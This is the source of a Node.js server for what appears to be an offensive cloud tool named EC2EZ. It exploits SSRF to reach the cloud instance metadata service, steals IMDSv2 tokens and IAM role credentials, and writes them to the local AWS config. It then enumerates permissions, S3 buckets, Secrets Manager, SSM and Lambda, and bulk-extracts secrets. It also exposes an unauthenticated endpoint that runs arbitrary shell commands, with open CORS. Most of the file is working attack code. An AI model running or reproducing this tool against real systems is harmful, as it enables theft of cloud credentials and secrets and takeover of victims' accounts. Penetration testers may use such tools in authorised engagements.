import express from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';
import cors from 'cors';
import path from 'path';
import { fileURLToPath } from 'url';

// Import EC2EZ modules
import * as imds from '../src/imds.js';
import * as aws from '../src/aws.js';
import * as permissions from '../src/permissions.js';
import * as s3discovery from '../src/s3discovery.js';
import { SessionSummary } from '../src/summary.js';
import { CONFIG } from '../src/config.js';
import { extractSSRFParam } from '../src/utils.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const httpServer = createServer(app);
const io = new Server(httpServer, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST'],
  },
});

app.use(cors());
app.use(express.json());

// Session state
let currentSession = {
  summary: new SessionSummary(),
  proxyUrl: null,
  token: null,
  credentials: null, // Store extracted credentials
  roles: [],
  permissions: null,
  metadata: {},
  metadataSecrets: [],
};

// Helper function to emit logs to UI
function emitLog(type, message, data = null) {
  const timestamp = new Date().toISOString().split('T')[1].split('.')[0];
  io.emit('log', { type, message, data, timestamp });
  console.log(`[${timestamp}] [${type.toUpperCase()}] ${message}`);
  if (data) {
    console.log(`[${timestamp}] [DATA]`, JSON.stringify(data, null, 2));
  }
}

// Scan metadata for credentials and secrets
function scanMetadataForSecrets(metadata) {
  const secrets = [];

  for (const [path, value] of Object.entries(metadata)) {
    const text = `${path} ${value}`;
    const findings = [];

    // AWS Access Key pattern: AKIA[0-9A-Z]{16}
    if (/AKIA[0-9A-Z]{16}/.test(text)) {
      findings.push('AWS Access Key');
    }

    // AWS Secret Key pattern (40 chars base64-like)
    if (/(?:^|[^A-Za-z0-9/+=])[A-Za-z0-9/+=]{40}(?:[^A-Za-z0-9/+=]|$)/.test(text)) {
      findings.push('Potential AWS Secret Key');
    }

    // Private keys
    if (/-----BEGIN.*PRIVATE KEY-----/.test(text)) {
      findings.push('Private Key');
    }

    // Password-related fields
    if (/(password|passwd|pwd|secret)[:=]/i.test(text)) {
      findings.push('Password field');
    }

    // API tokens
    if (/(api[_-]?key|apikey|token|bearer)[:=]/i.test(text)) {
      findings.push('API Token/Key');
    }

    // URLs with credentials (http://user:pass@host)
    if (/https?:\/\/[^:]+:[^@]+@/.test(text)) {
      findings.push('URL with credentials');
    }

    // JWT tokens
    if (/eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/.test(text)) {
      findings.push('JWT Token');
    }

    if (findings.length > 0) {
      secrets.push({
        path,
        value,
        types: findings
      });
    }
  }

  return secrets;
}

// Convert flat metadata paths to tree structure
function buildMetadataTree(metadata) {
  const tree = {};

  for (const [path, value] of Object.entries(metadata)) {
    const parts = path.split('/').filter(p => p);
    let current = tree;

    for (let i = 0; i < parts.length; i++) {
      const part = parts[i];
      const isLast = i === parts.length - 1;

      if (isLast) {
        // This is a file (leaf node)
        current[part] = {
          type: 'file',
          value: value,
          path: path
        };
      } else {
        // This is a folder
        if (!current[part]) {
          current[part] = {
            type: 'folder',
            children: {}
          };
        }
        current = current[part].children;
      }
    }
  }

  return tree;
}

// Start exploitation flow
app.post('/api/start', async (req, res) => {
  const { proxyUrl } = req.body;

  if (!proxyUrl) {
    return res.status(400).json({ error: 'Proxy URL is required' });
  }

  res.json({ status: 'started' });

  try {
    currentSession = {
      summary: new SessionSummary(),
      proxyUrl,
      token: null,
      roles: [],
      permissions: null,
    };

    // Auto-detect SSRF parameter name (same as CLI)
    emitLog('info', 'Starting exploitation flow...');
    emitLog('info', `Received proxy URL: ${proxyUrl}`);
    const paramName = extractSSRFParam(proxyUrl);
    CONFIG.ssrf.paramName = paramName;
    emitLog('info', `Auto-detected SSRF parameter name: ${paramName}`);

    io.emit('sessionUpdate', { proxyUrl });

    // Step 1: Test SSRF
    emitLog('info', 'Step 1: Testing SSRF vulnerability...');
    const testUrl = `${CONFIG.imdsv2.baseUrl}/latest/meta-data/`;
    const fullTestUrl = `${proxyUrl}${proxyUrl.includes('?') ? '' : '?'}${CONFIG.ssrf.paramName}=${encodeURIComponent(testUrl)}`;
    emitLog('info', `Target IMDS endpoint: ${testUrl}`);
    emitLog('info', `Full constructed URL: ${fullTestUrl}`);

    try {
      emitLog('info', 'Sending SSRF test request...');
      const isVulnerable = await imds.testSSRFVulnerability(proxyUrl);
      if (!isVulnerable) {
        emitLog('error', '✗ SSRF test failed - proxy not vulnerable or unreachable');
        emitLog('warning', '⚠ Possible issues: Proxy server not running, cannot reach 169.254.169.254, or wrong parameter');
        emitLog('info', 'Verify proxy can make requests to 169.254.169.254');
        io.emit('exploitationComplete');
        return;
      }
      emitLog('success', '✓ SSRF vulnerability confirmed');
      emitLog('info', 'Proxy is responding correctly to IMDS requests');
    } catch (error) {
      emitLog('error', `✗ SSRF test error: ${error.message}`);
      emitLog('info', `Error stack: ${error.stack || 'No stack trace available'}`);
      io.emit('exploitationComplete');
      return;
    }

    // Step 2: Extract IMDSv2 Token
    emitLog('info', 'Step 2: Extracting IMDSv2 token...');
    emitLog('info', 'Sending PUT request to token endpoint...');
    const token = await imds.fetchIMDSv2Token(proxyUrl);
    if (!token) {
      emitLog('error', '✗ Failed to extract IMDSv2 token');
      emitLog('warning', '⚠ Cannot proceed without valid IMDSv2 token');
      io.emit('exploitationComplete');
      return;
    }
    currentSession.token = token;
    emitLog('success', '✓ IMDSv2 token extracted successfully');
    emitLog('info', `Token TTL: 6 hours (21600 seconds)`);
    emitLog('info', `Token length: ${token.length} characters`);
    emitLog('info', `Token preview: ${token.substring(0, 50)}...`);
    currentSession.summary.setIMDS({ token, totalMetadata: 0 });

    // Send token to UI
    io.emit('sessionUpdate', { imdsToken: token });

    // Step 3: Enumerate IAM Roles
    emitLog('info', 'Step 3: Enumerating IAM roles...');
    emitLog('info', 'Querying /latest/meta-data/iam/security-credentials endpoint...');
    const roles = await imds.fetchAllIAMRoles(proxyUrl, token);
    if (!roles || roles.length === 0) {
      emitLog('warning', '⚠ No IAM roles found on instance');
      emitLog('info', 'This instance may not have an IAM instance profile attached');
    } else {
      emitLog('success', `✓ Found ${roles.length} IAM role(s)`);
      emitLog('info', `Roles: ${roles.join(', ')}`);
      currentSession.roles = roles;
    }

    // Step 4: Extract credentials for each role
    emitLog('info', 'Step 4: Extracting credentials for all roles...');
    for (const role of roles) {
      emitLog('info', `Processing role: ${role}`);
      emitLog('info', `Requesting credentials from /latest/meta-data/iam/security-credentials/${role}`);
      const creds = await imds.fetchCredentials(proxyUrl, token, role);

      if (creds) {
        emitLog('success', `✓ Credentials extracted for ${role}`);
        emitLog('info', `Access Key ID: ${creds.AccessKeyId}`);
        emitLog('info', `Secret Access Key: ${creds.SecretAccessKey.substring(0, 10)}...${creds.SecretAccessKey.substring(creds.SecretAccessKey.length - 4)}`);
        emitLog('info', `Session Token Length: ${creds.Token.length} characters`);
        emitLog('info', `Expiration: ${creds.Expiration}`);

        // Store credentials in session
        currentSession.credentials = {
          roleName: role,
          accessKeyId: creds.AccessKeyId,
          secretAccessKey: creds.SecretAccessKey,
          sessionToken: creds.Token,
          expiration: creds.Expiration,
        };

        currentSession.summary.addRole({
          name: role,
          accessKeyId: creds.AccessKeyId,
          secretAccessKey: creds.SecretAccessKey,
          token: creds.Token,
          expiration: creds.Expiration,
        });

        // Send credentials to UI
        io.emit('sessionUpdate', {
          credentials: currentSession.credentials
        });

        // Write credentials to file
        emitLog('info', 'Writing credentials to ~/.aws/credentials...');
        await imds.writeAWSCredentials(
          creds.AccessKeyId,
          creds.SecretAccessKey,
          creds.Token,
          CONFIG.aws.defaultRegion
        );
        emitLog('info', 'Credentials written successfully');

        // Validate credentials
        emitLog('info', 'Validating credentials with AWS STS...');
        emitLog('info', 'Running: aws sts get-caller-identity');
        const validation = await aws.validateCredentials(true);
        if (validation.valid) {
          emitLog('success', `✓ Credentials valid`);
          emitLog('info', `Account ID: ${validation.accountId}`);
          emitLog('info', `Region: ${validation.region}`);
          emitLog('info', `ARN: ${validation.arn || 'N/A'}`);
          currentSession.summary.setCredentials({
            extracted: true,
            valid: true,
            roleName: role,
            region: validation.region,
            accountId: validation.accountId,
          });

          io.emit('sessionUpdate', {
            accountId: validation.accountId,
            region: validation.region,
          });
        } else {
          emitLog('warning', '⚠ Credential validation failed');
        }
      } else {
        emitLog('error', `✗ Failed to extract credentials for ${role}`);
      }
    }

    // Step 5: Enumerate IMDS metadata
    emitLog('info', 'Step 5: Enumerating IMDS metadata...');
    emitLog('info', 'Recursively crawling /latest/meta-data endpoint...');
    emitLog('info', 'Building metadata tree structure for better visualization...');
    const metadata = await s3discovery.enumerateIMDSRecursive(proxyUrl, token, '/latest/meta-data');
    const metadataCount = Object.keys(metadata).length;
    emitLog('success', `✓ Discovered ${metadataCount} metadata entries`);
    emitLog('info', 'Metadata includes: instance-id, instance-type, placement, tags, user-data, etc.');
    emitLog('info', `Sample paths: ${Object.keys(metadata).slice(0, 3).join(', ')}...`);

    // Store metadata in session
    currentSession.metadata = metadata;

    // Build tree structure from flat paths
    emitLog('info', 'Converting metadata to tree structure...');
    const metadataTree = buildMetadataTree(metadata);
    emitLog('success', `✓ Metadata tree built with ${Object.keys(metadataTree).length} root nodes`);

    // Scan metadata for secrets/credentials
    emitLog('info', 'Scanning metadata for secrets and credentials...');
    emitLog('info', 'Checking for: AWS keys, private keys, passwords, API tokens, JWTs, URLs with credentials...');
    const metadataSecrets = scanMetadataForSecrets(metadata);
    currentSession.metadataSecrets = metadataSecrets;
    if (metadataSecrets.length > 0) {
      emitLog('warning', `⚠ Found ${metadataSecrets.length} potential secrets/credentials in metadata`);
      emitLog('info', `Secret types: ${[...new Set(metadataSecrets.flatMap(s => s.types))].join(', ')}`);
      emitLog('info', `Paths with secrets: ${metadataSecrets.map(s => s.path).slice(0, 3).join(', ')}${metadataSecrets.length > 3 ? '...' : ''}`);
    } else {
      emitLog('info', 'No obvious secrets found in metadata');
    }

    currentSession.summary.setIMDS({ token, totalMetadata: metadataCount });

    // Step 6: Enumerate permissions
    emitLog('info', 'Step 6: Enumerating IAM permissions...');
    emitLog('info', 'Testing common AWS API calls to discover granted permissions...');
    const permResults = await permissions.discoverPermissionsByTesting();
    currentSession.permissions = permResults;
    emitLog('success', `✓ Discovered ${permResults.totalPermissions} permissions`);
    emitLog('info', `Permissions by service: ${Object.keys(permResults.permissionsByService).length} services`);
    if (permResults.dangerousPermissionsList && permResults.dangerousPermissionsList.length > 0) {
      emitLog('warning', `⚠ Found ${permResults.dangerousPermissionsList.length} dangerous permissions`);
      emitLog('info', `Dangerous permissions: ${permResults.dangerousPermissionsList.join(', ')}`);
    }
    currentSession.summary.setPermissions({
      total: permResults.totalPermissions,
      discovered: permResults.allPermissions,
      dangerous: permResults.dangerousPermissionsList,
    });

    io.emit('sessionUpdate', {
      roles: currentSession.roles,
      permissions: permResults,
      metadata: metadataCount,
      metadataDetails: metadata,
      metadataTree: metadataTree,
      metadataSecrets: metadataSecrets,
    });

    // Step 7: Test S3 access
    emitLog('info', 'Step 7: Testing S3 access...');
    emitLog('info', 'Running: aws s3api list-buckets');
    emitLog('info', 'Checking for s3:ListAllMyBuckets permission...');
    try {
      const s3Results = await s3discovery.testS3Access();
      if (s3Results.buckets && s3Results.buckets.length > 0) {
        emitLog('success', `✓ Found ${s3Results.buckets.length} accessible S3 buckets`);
        emitLog('info', `S3 buckets: ${s3Results.buckets.slice(0, 5).join(', ')}${s3Results.buckets.length > 5 ? ` and ${s3Results.buckets.length - 5} more...` : ''}`);
        emitLog('info', 'You can now explore these buckets in the UI');
        io.emit('sessionUpdate', {
          s3Buckets: s3Results.buckets,
        });
      } else {
        emitLog('info', 'No S3 buckets found or no s3:ListAllMyBuckets permission');
        emitLog('info', 'This is normal if the role does not have S3 permissions');
      }
    } catch (error) {
      emitLog('warning', '⚠ S3 access test failed');
      emitLog('info', `Error: ${error.message}`);
      emitLog('info', 'This may indicate missing S3 permissions or network issues');
    }

    emitLog('success', '✓ Exploitation complete! All steps finished successfully.');
    emitLog('info', 'You can now use the action buttons to explore AWS resources.');
    io.emit('exploitationComplete');
  } catch (error) {
    emitLog('error', `✗ Exploitation failed: ${error.message}`);
    emitLog('info', `Error stack: ${error.stack || 'No stack trace available'}`);
    io.emit('exploitationComplete');
  }
});

// S3 Operations
app.get('/api/s3/buckets', async (req, res) => {
  try {
    console.log('[API] GET /api/s3/buckets - Listing S3 buckets');
    const rawOutput = await aws.listS3Buckets();
    // Parse raw CLI output: "2025-01-15 10:30:00 my-bucket-1"
    const buckets = rawOutput ? rawOutput.split('\n').map(line => {
      const parts = line.trim().split(/\s+/);
      return parts.length >= 3 ? parts[2] : null;
    }).filter(b => b) : [];
    console.log(`[API] Found ${buckets.length} S3 buckets`);
    res.json({ buckets });
  } catch (error) {
    console.error(`[API ERROR] Failed to list S3 buckets: ${error.message}`);
    res.status(500).json({ error: error.message, buckets: [] });
  }
});

app.post('/api/s3/list-objects', async (req, res) => {
  try {
    const { bucket, prefix } = req.body;
    console.log(`[API] POST /api/s3/list-objects - Listing objects in bucket: ${bucket} (prefix: ${prefix || 'none'})`);
    const rawOutput = await aws.listS3Objects(bucket, prefix);
    // Parse raw CLI output: "2025-01-15 10:30:00      12345 path/to/file.txt"
    const objects = rawOutput ? rawOutput.split('\n').map(line => {
      const parts = line.trim().split(/\s+/);
      // Format: date time size key
      return parts.length >= 4 ? parts.slice(3).join(' ') : null;
    }).filter(o => o) : [];
    console.log(`[API] Found ${objects.length} objects in bucket ${bucket}`);
    res.json({ objects });
  } catch (error) {
    console.error(`[API ERROR] Failed to list S3 objects: ${error.message}`);
    res.status(500).json({ error: error.message, objects: [] });
  }
});

app.post('/api/s3/download', async (req, res) => {
  try {
    const { bucket, key, outputPath } = req.body;
    await aws.downloadS3Object(bucket, key, outputPath);
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.post('/api/s3/upload', async (req, res) => {
  try {
    const { localPath, bucket, key } = req.body;
    await aws.uploadS3Object(localPath, bucket, key);
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Secrets Manager Operations
app.get('/api/secrets/list', async (req, res) => {
  try {
    console.log('[API] GET /api/secrets/list - Listing Secrets Manager secrets');
    const result = await aws.listSecrets();
    // Extract SecretList array and map to just names
    const secretObjects = result.SecretList || [];
    const secrets = secretObjects.map(s => s.Name);
    console.log(`[API] Found ${secrets.length} secrets`);
    res.json({ secrets });
  } catch (error) {
    console.error(`[API ERROR] Failed to list secrets: ${error.message}`);
    res.status(500).json({ error: error.message, secrets: [] });
  }
});

app.post('/api/secrets/get', async (req, res) => {
  try {
    const { secretName } = req.body;
    const value = await aws.getSecretValue(secretName);
    res.json({ value });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// SSM Operations
app.get('/api/ssm/parameters', async (req, res) => {
  try {
    console.log('[API] GET /api/ssm/parameters - Listing SSM parameters');
    const result = await aws.listSSMParameters();
    // Extract Parameters array and map to just names
    const paramObjects = result.Parameters || [];
    const parameters = paramObjects.map(p => p.Name);
    console.log(`[API] Found ${parameters.length} SSM parameters`);
    res.json({ parameters });
  } catch (error) {
    console.error(`[API ERROR] Failed to list SSM parameters: ${error.message}`);
    res.status(500).json({ error: error.message, parameters: [] });
  }
});

app.post('/api/ssm/get-parameter', async (req, res) => {
  try {
    const { paramName } = req.body;
    console.log(`[API] POST /api/ssm/get-parameter - Getting parameter: ${paramName}`);
    const value = await aws.getSSMParameter(paramName);
    console.log(`[API] Retrieved SSM parameter value`);
    res.json({ value });
  } catch (error) {
    console.error(`[API ERROR] Failed to get SSM parameter: ${error.message}`);
    res.status(500).json({ error: error.message });
  }
});

app.post('/api/ssm/put-parameter', async (req, res) => {
  try {
    const { paramName, value, paramType } = req.body;
    console.log(`[API] POST /api/ssm/put-parameter - Creating parameter: ${paramName} (type: ${paramType})`);
    await aws.createSSMParameter(paramName, value, paramType);
    console.log(`[API] SSM parameter created successfully`);
    res.json({ success: true });
  } catch (error) {
    console.error(`[API ERROR] Failed to create SSM parameter: ${error.message}`);
    res.status(500).json({ error: error.message });
  }
});

// IAM Operations
app.get('/api/iam/users', async (req, res) => {
  try {
    console.log('[API] GET /api/iam/users - Listing IAM users');
    const result = await aws.listIAMUsers();
    // Extract Users array and map to just usernames
    const userObjects = result.Users || [];
    const users = userObjects.map(u => u.UserName);
    console.log(`[API] Found ${users.length} IAM users`);
    res.json({ users });
  } catch (error) {
    console.error(`[API ERROR] Failed to list IAM users: ${error.message}`);
    res.status(500).json({ error: error.message, users: [] });
  }
});

app.get('/api/iam/roles', async (req, res) => {
  try {
    console.log('[API] GET /api/iam/roles - Listing IAM roles');
    const result = await aws.listIAMRoles();
    // Extract Roles array and map to just role names
    const roleObjects = result.Roles || [];
    const roles = roleObjects.map(r => r.RoleName);
    console.log(`[API] Found ${roles.length} IAM roles`);
    res.json({ roles });
  } catch (error) {
    console.error(`[API ERROR] Failed to list IAM roles: ${error.message}`);
    res.status(500).json({ error: error.message, roles: [] });
  }
});

// Lambda Operations
app.get('/api/lambda/functions', async (req, res) => {
  try {
    console.log('[API] GET /api/lambda/functions - Listing Lambda functions');
    const result = await aws.listLambdaFunctions();
    // Extract Functions array and map to just function names
    const functionObjects = result.Functions || [];
    const functions = functionObjects.map(f => f.FunctionName);
    console.log(`[API] Found ${functions.length} Lambda functions`);
    res.json({ functions });
  } catch (error) {
    console.error(`[API ERROR] Failed to list Lambda functions: ${error.message}`);
    res.status(500).json({ error: error.message, functions: [] });
  }
});

app.post('/api/lambda/invoke', async (req, res) => {
  try {
    const { functionName, payload } = req.body;
    console.log(`[API] POST /api/lambda/invoke - Invoking function: ${functionName}`);
    const result = await aws.invokeLambda(functionName, payload);
    console.log(`[API] Lambda invocation completed`);
    res.json({ result });
  } catch (error) {
    console.error(`[API ERROR] Failed to invoke Lambda: ${error.message}`);
    res.status(500).json({ error: error.message });
  }
});

// EC2 Operations
app.get('/api/ec2/instances', async (req, res) => {
  try {
    console.log('[API] GET /api/ec2/instances - Listing EC2 instances');
    const rawOutput = await aws.listEC2Instances();
    // Parse raw CLI output: "i-1234567890abcdef0    running    t3.micro    MyInstance"
    const instances = rawOutput ? rawOutput.split('\n').map(line => {
      const parts = line.trim().split(/\t/);
      if (parts.length >= 3) {
        return {
          InstanceId: parts[0],
          State: parts[1],
          InstanceType: parts[2],
          Name: parts[3] || 'N/A'
        };
      }
      return null;
    }).filter(i => i) : [];
    console.log(`[API] Found ${instances.length} EC2 instances`);
    res.json({ instances });
  } catch (error) {
    console.error(`[API ERROR] Failed to list EC2 instances: ${error.message}`);
    res.status(500).json({ error: error.message, instances: [] });
  }
});

app.post('/api/ec2/launch', async (req, res) => {
  try {
    console.log('[API] POST /api/ec2/launch - Launching EC2 instance');
    const instance = await aws.launchEC2Instance();
    console.log(`[API] EC2 instance launched successfully`);
    res.json({ instance });
  } catch (error) {
    console.error(`[API ERROR] Failed to launch EC2 instance: ${error.message}`);
    res.status(500).json({ error: error.message });
  }
});

// CloudWatch Operations
app.get('/api/cloudwatch/log-groups', async (req, res) => {
  try {
    console.log('[API] GET /api/cloudwatch/log-groups - Listing CloudWatch log groups');
    const { listLogGroups } = await import('../src/cloudwatch.js');
    const logGroups = await listLogGroups();
    console.log(`[API] Found ${logGroups.length} CloudWatch log groups`);
    res.json({ logGroups });
  } catch (error) {
    console.error(`[API ERROR] Failed to list CloudWatch log groups: ${error.message}`);
    res.status(500).json({ error: error.message });
  }
});

app.post('/api/cloudwatch/scan', async (req, res) => {
  try {
    const { logGroupName, hours, maxLogs } = req.body;
    const { scanCloudWatchLogs } = await import('../src/cloudwatch.js');
    const results = await scanCloudWatchLogs(logGroupName, hours, maxLogs);
    res.json({ results });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Shell command execution
app.post('/api/shell/exec', async (req, res) => {
  try {
    const { command } = req.body;
    console.log(`[API] POST /api/shell/exec - Executing command: ${command}`);

    const { exec } = await import('child_process');
    const { promisify } = await import('util');
    const execAsync = promisify(exec);

    const { stdout, stderr } = await execAsync(command);
    console.log(`[API] Command executed successfully`);

    res.json({
      output: stdout || stderr,
      stdout,
      stderr
    });
  } catch (error) {
    console.error(`[API ERROR] Shell command failed: ${error.message}`);
    res.status(500).json({ error: error.message, output: error.stdout || error.stderr });
  }
});

// Bulk secret extraction
app.post('/api/bulk/extract-secrets', async (req, res) => {
  try {
    console.log('[API] POST /api/bulk/extract-secrets - Starting bulk extraction');
    const { extractAllSecrets } = await import('../src/aws.js');
    const summary = await extractAllSecrets();
    console.log(`[API] Bulk extraction completed`);
    res.json({ summary });
  } catch (error) {
    console.error(`[API ERROR] Bulk extraction failed: ${error.message}`);
    res.status(500).json({ error: error.message });
  }
});

// Get session summary
app.get('/api/summary', (req, res) => {
  res.json({
    summary: currentSession.summary.findings,
  });
});

// WebSocket connection
io.on('connection', (socket) => {
  const clientId = socket.id.substring(0, 8);
  console.log(`[WEBSOCKET] Client connected - ID: ${clientId}`);
  socket.emit('log', {
    type: 'info',
    message: 'Connected to EC2EZ server',
    timestamp: new Date().toISOString().split('T')[1].split('.')[0],
  });

  socket.on('disconnect', () => {
    console.log(`[WEBSOCKET] Client disconnected - ID: ${clientId}`);
  });
});

const PORT = process.env.PORT || 3006;
httpServer.listen(PORT, () => {
  console.log('========================================');
  console.log('EC2EZ Server Started');
  console.log('========================================');
  console.log(`Server URL: http://localhost:${PORT}`);
  console.log(`API Endpoints: http://localhost:${PORT}/api/*`);
  console.log(`WebSocket: ws://localhost:${PORT}`);
  console.log('========================================');
  console.log('Ready to accept connections...');
  console.log('========================================');
});
